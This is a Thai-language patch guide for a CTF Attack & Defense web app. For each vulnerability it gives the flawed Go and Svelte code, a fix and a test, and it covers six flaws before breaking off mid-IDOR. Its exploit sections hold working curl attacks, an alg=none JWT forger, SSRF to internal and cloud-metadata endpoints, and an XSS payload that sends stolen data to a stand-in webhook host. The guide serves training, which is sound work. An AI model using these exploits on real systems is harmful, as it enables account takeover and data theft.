# 🛡️ PATCH GUIDE — Attack & Defense CTF

## ช่องโหว่ทั้งหมดและวิธีแก้ไข

> คู่มือนี้สำหรับ **EduBoard** challenge ใน IT Clash 2569 (Cybersecurity Track)
> เป้าหมาย: patch ช่องโหว่ทั้ง 8 จุดให้ครบใน 1 ชั่วโมงก่อนเปิดศึก ⚔️

---

## 🗂️ สารบัญ (Table of Contents)

- [ช่องโหว่ที่ 1: SQL Injection — Login Bypass](#vuln1)
- [ช่องโหว่ที่ 2: SQL Injection — UNION Search](#vuln2)
- [ช่องโหว่ที่ 3: JWT Algorithm None Bypass](#vuln3)
- [ช่องโหว่ที่ 4: SSRF via Webhook Bot](#vuln4)
- [ช่องโหว่ที่ 5: Stored XSS + Admin Bot](#vuln5)
- [ช่องโหว่ที่ 6: IDOR — No Ownership Check](#vuln6)
- [ช่องโหว่ที่ 7: Path Traversal](#vuln7)
- [ช่องโหว่ที่ 8: Mass Assignment](#vuln8)
- [ลำดับการ Patch ตอนแข่ง](#priority)
- [วิธี Rebuild ไม่ให้ Downtime นาน](#rebuild)
- [RCE & Crash Attack — ตัวล่มระบบ](#rce-crash)
- [Script โจมตีทีมอื่น](#attack-scripts)
- [สรุป Ctrl+F Keywords](#ctrlf)

---

## <a id="vuln1"></a>🚨 ช่องโหว่ที่ 1: SQL Injection — Login Bypass

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `handleLogin`
- บรรทัด: **134–194** (โค้ดบาปอยู่ที่ **บรรทัด 157–167**)
- วิธีหา:
  > Ctrl+F หาคำว่า `fmt.Sprintf` แล้วดูตัวแรกที่อยู่ใกล้ `db.QueryRow`

### 🔍 สังเกตได้จากอะไร (Code Smell)

- มีการใช้ `fmt.Sprintf(...)` เอา `username` กับ `password` มา **ต่อ string ตรงๆ** เข้ากับ SQL query
- เห็น `%s` ใน query string = สัญญาณว่ารับ input จาก user มาแปะตรงๆ
- error message โยน `err.Error()` กลับไปทั้งดุ้น → leak SQL error ให้ attacker เห็นด้วย

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 156-172 ใน main.go
// check session
q := fmt.Sprintf(
    "SELECT id,username,password,role FROM users WHERE username='%s' AND password='%s'",
    username, password,    // <-- บาป: เอา input ของ user มาแปะใน query ตรงๆ
)
var u struct {
    ID       int
    Username string
    Password string
    Role     string
}
err := db.QueryRow(q).Scan(&u.ID, &u.Username, &u.Password, &u.Role)
if err != nil {
    w.WriteHeader(401)
    w.Write([]byte(`{"error":"` + err.Error() + `"}`))  // <-- บาปซ้อน: leak SQL error
    return
}
```

### 💥 ผลกระทบ (Impact)

- Attacker ส่ง `' OR 1=1 LIMIT 1-- -` เป็น username → bypass password ได้เลย
- ได้ JWT token ของ user คนแรกใน DB ซึ่งคือ **admin**
- เข้า `/api/admin/flags` ได้ → เก็บธงที่ 1 (`CTF{sql_l0g1n_byp4ss_4dm1n}`)
- ยังใช้ error message ที่ leak ออกมาในการ map schema ของ DB ได้อีก

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Login เป็น admin โดยไม่รู้รหัสผ่าน
curl -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1 LIMIT 1-- -","password":"x"}'

# Response:
# {"token":"eyJhbGc...","username":"admin","role":"admin","user_id":1}

# เอา token ไปขอ flag
TOKEN="eyJhbGc..."
curl http://TARGET:8080/api/admin/flags \
  -H "Authorization: Bearer $TOKEN"
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 156-167 ด้วยโค้ดนี้:
var u struct {
    ID       int
    Username string
    Password string
    Role     string
}
// ใช้ parameterized query ($1, $2) → PostgreSQL จะ escape ให้เอง
err := db.QueryRow(
    "SELECT id,username,password,role FROM users WHERE username=$1 AND password=$2",
    username, password,
).Scan(&u.ID, &u.Username, &u.Password, &u.Role)

if err != nil {
    w.WriteHeader(401)
    // อย่า leak error จริงออกไป ใช้ error generic แทน
    w.Write([]byte(`{"error":"invalid credentials"}`))
    return
}
```

**ทำไมปลอดภัยขึ้น:** lib/pq ใช้ `prepared statement` ส่ง `$1`, `$2` เป็น parameter แยกจาก SQL → attacker ใส่ `' OR 1=1--` จะถูกตีความเป็น **string ของ username ทั้งตัว** ไม่ใช่ SQL command อีกต่อไป

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลองยิง payload เดิม - ต้องได้ 401 invalid credentials
curl -i -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1 LIMIT 1-- -","password":"x"}'

# ✅ Patch สำเร็จ: HTTP/1.1 401 + {"error":"invalid credentials"}
# ❌ Patch ไม่สำเร็จ: HTTP/1.1 200 + มี token กลับมา

# ทดสอบว่า user จริงยัง login ได้
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Adm1nS3cur3!2024"}'
# ต้องได้ token กลับมาปกติ
```

---

## <a id="vuln2"></a>🚨 ช่องโหว่ที่ 2: SQL Injection — UNION Search

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `handleCourseSearch`
- บรรทัด: **317–359** (โค้ดบาปอยู่ที่ **บรรทัด 328–334**)
- วิธีหา:
  > Ctrl+F หาคำว่า `LIKE '%%%s%%'` หรือ `fmt.Sprintf` ตัวที่สองใน main.go

### 🔍 สังเกตได้จากอะไร (Code Smell)

- เห็น `fmt.Sprintf` ที่มี `%%%s%%` ติดกัน (escape % สำหรับ LIKE wildcard)
- ตัวแปร `q2` มาจาก `r.URL.Query().Get("q")` แล้วยัดเข้า query โดยตรง
- เห็น `json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})` → leak error ออกไป

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 325-335 ใน main.go
q2 := r.URL.Query().Get("q")

// search courses by title or description
rr, err := db.Query(fmt.Sprintf(
    "SELECT id,title,description,instructor_id,credits FROM courses WHERE title LIKE '%%%s%%' OR description LIKE '%%%s%%' LIMIT 20",
    q2, q2,    // <-- บาป: เอา q2 มาต่อเข้า query 2 จุด
))
if err != nil {
    // ยิ่งบาปซ้อน: leak SQL error ทำให้ attacker debug query ได้
    json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
    return
}
```

### 💥 ผลกระทบ (Impact)

- Attacker ใช้ `UNION SELECT` ดึงข้อมูลจากตารางอื่นได้ทั้งหมด
- ในโจทย์นี้มีตาราง `flag_store` ที่เก็บ flag ทั้ง 8 อัน → ดึงออกมาได้หมด
- ดึง password ของ user คนอื่นได้ด้วย (เพราะ DB เก็บ plaintext)
- ใช้ error message debug query เพื่อหา column count ที่ตรง

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Step 1: หาจำนวน column ที่ต้อง UNION ให้ตรง (query เดิมมี 5 column)
# Step 2: UNION ดึง flag_store
curl "http://TARGET:8080/api/courses/search?q=' UNION SELECT 1,flag_name,flag_value,4,5 FROM flag_store-- -"

# จะได้ JSON กลับมาที่มี flag ทั้งหมดใน field "title" และ "description":
# [{"id":1,"title":"sqli_login","description":"CTF{sql_l0g1n_byp4ss_4dm1n}",...}, ...]

# Bonus: ดึง password ของทุก user
curl "http://TARGET:8080/api/courses/search?q=' UNION SELECT id,username,password,role::int,1 FROM users-- -"
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 327-334 ด้วยโค้ดนี้:
q2 := r.URL.Query().Get("q")

// ใช้ parameterized query - ใส่ % รอบ q2 ใน Go ไม่ใช่ใน SQL
pattern := "%" + q2 + "%"
rr, err := db.Query(
    "SELECT id,title,description,instructor_id,credits FROM courses WHERE title LIKE $1 OR description LIKE $1 LIMIT 20",
    pattern,
)
if err != nil {
    // อย่า leak error จริง
    http.Error(w, `{"error":"search failed"}`, 500)
    return
}
```

**ทำไมปลอดภัยขึ้น:** `$1` เป็น placeholder ที่ PostgreSQL รู้ว่าเป็นค่า ไม่ใช่ SQL → attacker ใส่ `' UNION SELECT ...` จะถูกหาว่าเป็น **substring ที่ต้อง LIKE** ไม่ใช่ command

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลอง UNION payload เดิม - ต้องไม่ได้ flag กลับมา
curl "http://localhost:8080/api/courses/search?q=' UNION SELECT 1,flag_name,flag_value,4,5 FROM flag_store-- -"

# ✅ Patch สำเร็จ: ได้ [] (array ว่าง) เพราะไม่มีคอร์สที่ title/desc มี string นี้
# ❌ Patch ไม่สำเร็จ: ยังมี "CTF{...}" โผล่ใน response

# ทดสอบว่า search ปกติยังใช้ได้
curl "http://localhost:8080/api/courses/search?q=Web"
# ต้องได้ courses ที่มีคำว่า Web กลับมา
```

---

## <a id="vuln3"></a>🚨 ช่องโหว่ที่ 3: JWT Algorithm None Bypass

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `jwtCheck`
- บรรทัด: **41–61** (โค้ดบาปอยู่ที่ **บรรทัด 49–55**)
- มี secret key บาปอีก: **บรรทัด 24** → `signingKey = []byte("eduboard2024")` (อ่อนแอ ใช้ brute-force คาดเดาง่าย)
- วิธีหา:
  > Ctrl+F หาคำว่า `SigningMethodNone` หรือ `UnsafeAllowNoneSignatureType`

### 🔍 สังเกตได้จากอะไร (Code Smell)

- function callback ของ `jwt.ParseWithClaims` **ยอมรับทั้ง `HS256` และ `None`** = สัญญาณบาปชัดเจน
- มี `jwt.UnsafeAllowNoneSignatureType` อยู่ใน production code → คำว่า **Unsafe** อยู่ในชื่อตรงๆ
- บรรทัด 55 มี `return signingKey, nil` ตอนท้าย = ถ้า alg ไม่ match อะไร ก็ยอมรับซะอีก
- secret key เป็น string ที่เดาได้ง่ายมาก (`eduboard2024`)

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 22-26 ใน main.go
var (
    db                *sql.DB
    signingKey        = []byte("eduboard2024")  // <-- บาป: secret อ่อนแอ
    adminSessionSecret string
)

// บรรทัด 41-61 ใน main.go
func jwtCheck(r *http.Request) (*jwt.MapClaims, bool) {
    tokenStr := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
    if tokenStr == "" {
        return nil, false
    }
    cl := &jwt.MapClaims{}
    token, err := jwt.ParseWithClaims(tokenStr, cl,
        func(t *jwt.Token) (interface{}, error) {
            if t.Method == jwt.SigningMethodHS256 {
                return signingKey, nil
            }
            // 🔥 บาปจุดที่ 1: ยอมรับ alg=none = ไม่ verify signature เลย
            if t.Method == jwt.SigningMethodNone {
                return jwt.UnsafeAllowNoneSignatureType, nil
            }
            // 🔥 บาปจุดที่ 2: fallback ยอมรับทุก alg
            return signingKey, nil
        })
    if err != nil || !token.Valid {
        return nil, false
    }
    return cl, true
}
```

### 💥 ผลกระทบ (Impact)

- Attacker สร้าง JWT token ปลอมที่มี `alg=none` ได้ → ไม่ต้องรู้ secret
- ใส่ `role: "admin"` ใน payload → เป็น admin ทันที
- เข้า `/api/admin/flags`, `/api/admin/users`, สร้างคอร์ส, ฯลฯ ได้หมด
- หรือถ้าเก็บ token มาวิเคราะห์ ก็ใช้ `john`, `hashcat`, `jwt_tool` brute-force secret `eduboard2024` ได้ (ลองคำว่า "eduboard" + ปี = แตกใน ~5 วินาที)

### ⚔️ วิธีโจมตี (Exploit)

```bash
# วิธีที่ 1: สร้าง JWT alg=none ด้วย Python
python3 << 'EOF'
import base64, json
header  = {"alg":"none","typ":"JWT"}
payload = {"user_id":1,"username":"admin","role":"admin","exp":9999999999}

def b64(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()

token = f"{b64(header)}.{b64(payload)}."  # signature ว่าง
print(token)
EOF

# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjox...etc.

# ใช้ token แอบเป็น admin
curl http://TARGET:8080/api/admin/flags \
  -H "Authorization: Bearer eyJhbGciOiJub25lIi..."

# วิธีที่ 2: brute-force secret อ่อนแอ
echo "<TOKEN>" > token.txt
jwt_tool -C -d /usr/share/wordlists/rockyou.txt token.txt
# จะได้ "eduboard2024" ภายใน 5 วินาที
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 24 (secret อ่อนแอ) ด้วย:
signingKey = []byte(ge("JWT_SECRET", "")) // อ่านจาก env var แทน
// (แล้วใน docker-compose.yml เพิ่ม env: JWT_SECRET: <random 64-char string>)

// หรือถ้าจะใช้ hardcode ก็ใช้ string ที่ยาวและ random:
// signingKey = []byte("k8Jx#mP2!nQ7vR9$wT5zY1aB4cD6eF8gH0iJ3lL5oO7pP")

// แทนที่บรรทัด 47-56 (function callback) ด้วย:
token, err := jwt.ParseWithClaims(tokenStr, cl,
    func(t *jwt.Token) (interface{}, error) {
        // ยอมรับเฉพาะ HMAC เท่านั้น ไม่ยอมรับ none, RS256, หรืออะไรอื่น
        if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", t.Header["alg"])
        }
        return signingKey, nil
    })
```

**ทำไมปลอดภัยขึ้น:**

1. ใช้ type assertion `*jwt.SigningMethodHMAC` → ทุก algorithm ที่ไม่ใช่ HMAC จะถูกปฏิเสธทันที (none, RS256, ES256 ฯลฯ)
2. ไม่มี fallback `return signingKey, nil` ตอนท้าย
3. secret ที่ยาวและสุ่ม → brute-force ไม่ไหวในเวลาแข่ง

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลอง alg=none token เดิม - ต้องได้ 401
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ."
curl -i http://localhost:8080/api/admin/flags \
  -H "Authorization: Bearer $TOKEN"

# ✅ Patch สำเร็จ: HTTP/1.1 401 unauthorized
# ❌ Patch ไม่สำเร็จ: HTTP/1.1 200 + flags
```

---

## <a id="vuln4"></a>🚨 ช่องโหว่ที่ 4: SSRF via Webhook Bot

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชันรับ input: `handleRequestGrade` บรรทัด **528–572**
- ฟังก์ชัน background ที่ exploit: `gradingBot` บรรทัด **983–1022**
- โค้ดบาปจริง: **บรรทัด 1006** (`resp, err := cl.Get(p.wh)`)
- วิธีหา:
  > Ctrl+F หาคำว่า `cl.Get(` หรือ `http.Get(` ที่อยู่ใน goroutine

### 🔍 สังเกตได้จากอะไร (Code Smell)

- รับ field `webhook_url` จาก JSON แล้ว **เก็บลง DB ทันที** ไม่ validate อะไรเลย
- มี goroutine `gradingBot` ที่หยิบ URL จาก DB ไป `http.Get` แล้วเก็บ response body กลับเข้า DB
- response field กลับไปให้ user อ่านได้ผ่าน `/api/assignments/my-grades` → **out-of-band exfiltration**
- server รัน goroutine นี้จาก `localhost` → ถึง internal endpoint ที่กันด้วย `islo(r)` ได้

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 545-561 ใน main.go (handleRequestGrade)
type GradeReq struct {
    AssignmentID int    `json:"assignment_id"`
    WebhookURL   string `json:"webhook_url"`  // <-- รับ URL จาก user
}
var req GradeReq
json.NewDecoder(r.Body).Decode(&req)

if req.WebhookURL == "" {
    http.Error(w, `{"error":"webhook_url required"}`, 400)
    return
}

// 🔥 บาป: ไม่ validate URL เลย จับยัด DB เลย
var nid int
err := db.QueryRow(
    "INSERT INTO grade_requests (assignment_id,user_id,webhook_url,status) VALUES ($1,$2,$3,'pending') RETURNING id",
    aid, uid, req.WebhookURL,
).Scan(&nid)
```

```go
// บรรทัด 983-1022 ใน main.go (gradingBot)
func gradingBot(dbc *sql.DB) {
    cl := &http.Client{Timeout: 10 * time.Second}
    for {
        time.Sleep(25 * time.Second)
        rr, err := dbc.Query("SELECT id,webhook_url FROM grade_requests WHERE status='pending' LIMIT 5")
        // ...
        for _, p := range pending {
            // 🔥 บาป: http.Get URL อะไรก็ได้ที่ user ส่งมา รวมถึง localhost
            resp, err := cl.Get(p.wh)
            if err == nil {
                body, _ := io.ReadAll(resp.Body)
                resp.Body.Close()
                // 🔥 บาปซ้อน: เก็บ response body ลง DB → user อ่านได้ทีหลัง
                dbc.Exec("UPDATE grade_requests SET status='done',response=$1 WHERE id=$2",
                    string(body), p.id)
            }
        }
    }
}
```

### 💥 ผลกระทบ (Impact)

- Attacker ส่ง `webhook_url = http://localhost:8080/internal/flags` → bot อ่านได้เพราะมาจาก `127.0.0.1`
- bot เก็บ response (ที่มี flag ทั้ง 8) ลง field `response` ของตาราง `grade_requests`
- Attacker อ่าน flag ผ่าน `/api/assignments/my-grades` ปกติ
- โจมตี internal services อื่น: `/internal/config` (มี signing_key), AWS metadata (169.254.169.254), Redis (127.0.0.1:6379), etc.

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Step 1: register + login ก่อน
curl -X POST http://TARGET:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"ssrf_test","password":"pwd","email":"x@x.com"}'

TOKEN=$(curl -s -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"ssrf_test","password":"pwd"}' | jq -r .token)

# Step 2: ส่ง webhook URL ชี้ไปที่ internal endpoint
curl -X POST "http://TARGET:8080/api/assignments/2/request-grade" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"assignment_id":2,"webhook_url":"http://localhost:8080/internal/flags"}'

# Step 3: รอ 30 วินาที (bot ทำงานทุก 25s)
sleep 30

# Step 4: อ่าน response กลับมา - มี flag ทั้งหมด
curl "http://TARGET:8080/api/assignments/my-grades" \
  -H "Authorization: Bearer $TOKEN"
# field "response" จะมี: [{"name":"sqli_login","value":"CTF{sql_l0g1n_byp4ss_4dm1n}"}, ...]
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// เพิ่ม import ที่ด้านบนของ main.go (ถ้ายังไม่มี):
// "net/url"

// เพิ่มฟังก์ชันใหม่ก่อน handleRequestGrade (เช่นบรรทัด ~527):
func isInternalURL(rawURL string) bool {
    u, err := url.Parse(rawURL)
    if err != nil {
        return true  // parse ไม่ได้ ถือว่าบาป block ไว้ก่อน
    }
    if u.Scheme != "http" && u.Scheme != "https" {
        return true  // block file://, gopher://, ftp:// ฯลฯ
    }
    h := u.Hostname()
    if h == "" {
        return true
    }
    // block private IP ranges + localhost
    blocked := []string{
        "localhost", "127.", "10.", "192.168.",
        "172.16.", "172.17.", "172.18.", "172.19.",
        "172.20.", "172.21.", "172.22.", "172.23.",
        "172.24.", "172.25.", "172.26.", "172.27.",
        "172.28.", "172.29.", "172.30.", "172.31.",
        "169.254.",  // AWS/cloud metadata
        "0.0.0.0", "::1",
    }
    for _, b := range blocked {
        if strings.HasPrefix(h, b) || h == strings.TrimSuffix(b, ".") {
            return true
        }
    }
    return false
}

// แทรกในบรรทัด ~552 (ก่อน insert DB) ใน handleRequestGrade:
if req.WebhookURL == "" {
    http.Error(w, `{"error":"webhook_url required"}`, 400)
    return
}

// เพิ่มบรรทัดนี้:
if isInternalURL(req.WebhookURL) {
    http.Error(w, `{"error":"webhook url not allowed"}`, 400)
    return
}
```

**ทำไมปลอดภัยขึ้น:** block URL ที่ชี้ไป localhost, private network, และ cloud metadata → bot จะ fetch ได้แค่ external server เท่านั้น

> ⚠️ **หมายเหตุ:** การ block ด้วย hostname อย่างเดียวยัง bypass ได้ด้วย DNS rebinding หรือ `127.0.0.1.nip.io`
> ถ้าจะรอบคอบกว่านี้ ต้อง resolve DNS ก่อน แล้วเช็ค IP ที่ได้ด้วย แต่สำหรับ CTF นี้ block hostname พอ

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลองส่ง localhost URL - ต้องโดน reject
curl -X POST "http://localhost:8080/api/assignments/2/request-grade" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"assignment_id":2,"webhook_url":"http://localhost:8080/internal/flags"}'

# ✅ Patch สำเร็จ: {"error":"webhook url not allowed"}
# ❌ Patch ไม่สำเร็จ: {"id":N,"status":"pending",...}

# ลอง URL ภายนอก - ต้องผ่าน
curl -X POST "http://localhost:8080/api/assignments/2/request-grade" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"assignment_id":2,"webhook_url":"https://example.com/"}'
# ต้องสร้าง grade_request ได้ปกติ
```

---

## <a id="vuln5"></a>🚨 ช่องโหว่ที่ 5: Stored XSS + Admin Bot

### 📍 อยู่ที่ไหนใน main.go และ frontend

- **Backend:** `handleReviews` (case POST) บรรทัด **664–706** — โค้ดเก็บ review ที่บรรทัด **692–695**
- **Background:** `reviewBot` บรรทัด **1024–1059** — เป็นตัวที่เปิดเว็บ admin (มี session cookie)
- **Frontend XSS sink:**
  - `frontend/src/pages/Reviews.svelte` บรรทัด **173** → `{@html review.content}`
  - `frontend/src/pages/Admin.svelte` บรรทัด **182** → `{@html review.content}`
  - `frontend/src/pages/Search.svelte` บรรทัด **68** → `{@html course.description}` (vector เสริม)
- วิธีหา:
  > Backend: Ctrl+F หา `INSERT INTO reviews`
  > Frontend: Ctrl+F หา `{@html`

### 🔍 สังเกตได้จากอะไร (Code Smell)

- Backend: รับ `req.Content` มา **insert ลง DB ตรงๆ** ไม่ได้ escape HTML
- Frontend: ใช้ `{@html ...}` directive ใน Svelte → render HTML ดิบไม่ escape
- มี goroutine `reviewBot` ที่ visit `/admin/reviews` **พร้อม admin session cookie** → ถ้า payload XSS รัน script ใน browser context จะขโมย session ได้

### ❌ โค้ดก่อนแก้ (Vulnerable)

**Backend** (`main.go` บรรทัด 686-701):

```go
// store review
var nid int
var x interface{}
if req.CourseID != 0 {
    x = req.CourseID
}
// 🔥 บาป: เก็บ req.Content ดิบๆ ไม่ escape HTML
err := db.QueryRow(
    "INSERT INTO reviews (course_id,user_id,content,rating,is_flagged) VALUES ($1,$2,$3,$4,true) RETURNING id",
    x, uid, req.Content, req.Rating,
).Scan(&nid)
```

**Frontend** (`Reviews.svelte` บรรทัด 168-176):

```svelte
<div class="review-content small text-break">
  {@html review.content}    <!-- 🔥 บาป: render HTML ที่ user ส่งมา -->
</div>
```

**Frontend** (`Admin.svelte` บรรทัด 178-184):

```svelte
<div class="small review-body">
  {@html review.content}    <!-- 🔥 บาป: admin page render HTML ดิบเหมือนกัน -->
</div>
```

### 💥 ผลกระทบ (Impact)

- Attacker ฝัง `<script>` ใน review → ทุกคนที่เปิดหน้า Reviews เจอจะรัน JS ของ attacker
- ถ้า admin คนจริงเปิดหน้า admin → script ใช้ `fetch('/api/admin/session-flag', {credentials:'include'})` ขโมย flag ได้
- `reviewBot` มี admin session cookie อยู่ → จำลอง admin auto-visit `/admin/reviews` ทุก 35 วินาที
- ลามถึงการขโมย JWT จาก `localStorage` ของผู้ใช้คนอื่นที่เปิดเว็บ

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Step 1: login เป็น user ปกติก่อน
TOKEN=$(curl -s -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student_alice","password":"alice123"}' | jq -r .token)

# Step 2: ส่ง review ที่มี payload XSS
# payload นี้จะ fetch flag แล้วส่งไป webhook ของ attacker
PAYLOAD='<script>fetch("/api/admin/session-flag",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://YOUR-WEBHOOK.com/?x="+btoa(d)))</script>'

curl -X POST "http://TARGET:8080/api/reviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"course_id\":1,\"content\":\"$PAYLOAD\",\"rating\":5}"

# Step 3: รอ admin จริงเข้ามาดู หรือ trick admin ให้คลิก link
# (reviewBot เป็น http.Client ธรรมดา ไม่รัน JS แต่ในชีวิตจริง admin team เข้ามาดู)
# Step 4: เช็ค webhook ของตัวเองดู base64 decode → ได้ flag
```

> 💡 **เคล็ดลับ:** ใช้ webhook ฟรีเช่น `https://webhook.site` หรือ `https://requestbin.com` เพื่อรับ flag

### ✅ โค้ดหลังแก้ (Patched)

**Patch ที่ backend** (`main.go`):

```go
// เพิ่ม import ที่ด้านบน (ถ้ายังไม่มี):
// "html"

// แทนที่บรรทัด 692-695 ใน main.go ด้วย:
sanitized := html.EscapeString(req.Content)  // escape < > & " ' → &lt; &gt; ฯลฯ

err := db.QueryRow(
    "INSERT INTO reviews (course_id,user_id,content,rating,is_flagged) VALUES ($1,$2,$3,$4,true) RETURNING id",
    x, uid, sanitized, req.Rating,
).Scan(&nid)
```

**Patch ที่ frontend** — `Reviews.svelte` บรรทัด 173:

```svelte
<!-- เปลี่ยนจาก -->
{@html review.content}
<!-- เป็น -->
{review.content}
```

**Patch ที่ frontend** — `Admin.svelte` บรรทัด 182:

```svelte
<!-- เปลี่ยนจาก -->
{@html review.content}
<!-- เป็น -->
{review.content}
```

**Patch ที่ frontend** — `Search.svelte` บรรทัด 68:

```svelte
<!-- เปลี่ยนจาก -->
{@html course.description}
<!-- เป็น -->
{course.description}
```

**ทำไมปลอดภัยขึ้น:**

- Backend `html.EscapeString` แปลง `<script>` เป็น `&lt;script&gt;` → ไม่ใช่ tag จริงแล้ว
- Frontend `{var}` (ไม่มี `@html`) คือ default behavior ของ Svelte ที่จะ escape อัตโนมัติ
- 2 ชั้นป้องกัน (defense in depth) — แม้ patch หลุดด้านใดด้านหนึ่งก็ยังกันได้

> ⚠️ **ระวัง:** ถ้าใน DB มี review เก่าที่มี XSS อยู่แล้ว ต้อง clear ออกด้วย หรือ escape ตอน read ก็ได้:
>
> ```sql
> UPDATE reviews SET content = REPLACE(REPLACE(content, '<', '&lt;'), '>', '&gt;');
> ```

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ส่ง XSS payload อีกครั้ง
curl -X POST http://localhost:8080/api/reviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"course_id":1,"content":"<script>alert(1)</script>","rating":5}'

# ดู review ที่เพิ่มเข้าไป
curl http://localhost:8080/api/reviews | jq '.[0].content'

# ✅ Patch สำเร็จ: "&lt;script&gt;alert(1)&lt;/script&gt;"
# ❌ Patch ไม่สำเร็จ: "<script>alert(1)</script>"

# เปิดเบราว์เซอร์ไปที่ http://localhost:8080 → หน้า Reviews ต้องไม่มี alert popup
```

---

## <a id="vuln6"></a>🚨 ช่องโหว่ที่ 6: IDOR — No Ownership Check

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `handleGetAssignment`
- บรรทัด: **430–482** (โค้ดบาปอยู่ที่ **บรรทัด 431–435**)
- วิธีหา:
  > Ctrl+F หาคำว่า `handleGetAssignment` → สังเกตว่ามี `jwtCheck` แต่ **ไม่ใช้** ตัวแปร claims ในการเช็ค ownership

### 🔍 สังเกตได้จากอะไร (Code Smell)

- บรรทัด 431 มี `_, ok := jwtCheck(r)` → ใช้ `_` ทิ้ง claims ไปเลย!
- มี field `SubmitterID` ดึงมาจาก DB แต่ไม่ได้เปรียบเทียบกับ `user_id` ใน JWT
- มี dead code ที่บรรทัด 467-471 (เช็ค `a.ID < 0` ซึ่งเป็นไปไม่ได้) → ใส่มาเพื่อหลอกคนอ่าน

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 430-481 ใน main.go (handleGetAssignment)
func handleGetAssignment(w http.ResponseWriter, r *http.Request) {
    _, ok := jwtCheck(r)   // 🔥 บาป: รับ claims แต่ใช้ _ ทิ้ง = ไม่ได้ใช้ user_id เช็คอะไร
    if !ok {
        http.Error(w, `{"error":"unauthorized"}`, 401)
        return
    }

    aid := xid(r.URL.Path)
    if aid == 0 {
        http.Error(w, `{"error":"invalid id"}`, 400)
        return
    }

    var a struct {
        ID          int            `json:"id"`
        Title       string         `json:"title"`
        Content     string         `json:"content"`
        SecretNote  string         `json:"secret_note"`     // <-- field ที่มี flag
        SubmitterID int            `json:"submitter_id"`    // <-- รู้ว่าใครเป็นเจ้าของ แต่...
        CourseID    sql.NullInt64  `json:"-"`
        CourseIDOut int            `json:"course_id"`
        CreatedAt   time.Time      `json:"created_at"`
    }

    err := db.QueryRow(
        "SELECT id,title,content,secret_note,submitter_id,course_id,created_at FROM assignments WHERE id=$1",
        aid,
    ).Scan(&a.ID, &a.Title, &a.Content, &a.SecretNote, &a.SubmitterID, &a.CourseID, &a.CreatedAt)
    // 🔥 บาป: ไม่เช็คว่า a.SubmitterID == user ที่ login อยู่หรือไม่

    if err != nil {
        http.Error(w, `{"error":"not found"}`, 404)
        return
    }
    // ... ส่ง secret_note ออกไปทั้งดุ้น
}
```

### 💥 ผลกระทบ (Impact)

- User คนไหนก็ตามที่ login แล้ว สามารถดู assignment ID อะไรก็ได้
- assignment id=1 เป็นของ admin มี `secret_note` = `CTF{1d0r_4ss1gnm3nt_n0_0wn3rch3ck}`
- enumerate ทุก ID 1-100 หาธง + ข้อมูลส่วนตัวของคนอื่น
- ดูข้อมูล draft assignment ของ user อื่นได้

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Step 1: register + login เป็น user ใหม่ใดๆ
curl -X POST http://TARGET:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"idor_pwn","password":"pwd","email":"x@x.com"}'

TOKEN=$(curl -s -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"idor_pwn","password":"pwd"}' | jq -r .token)

# Step 2: enumerate assignment IDs
for i in $(seq 1 30); do
  echo "--- assignment $i ---"
  curl -s "http://TARGET:8080/api/assignments/$i/details" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.secret_note // empty'
done

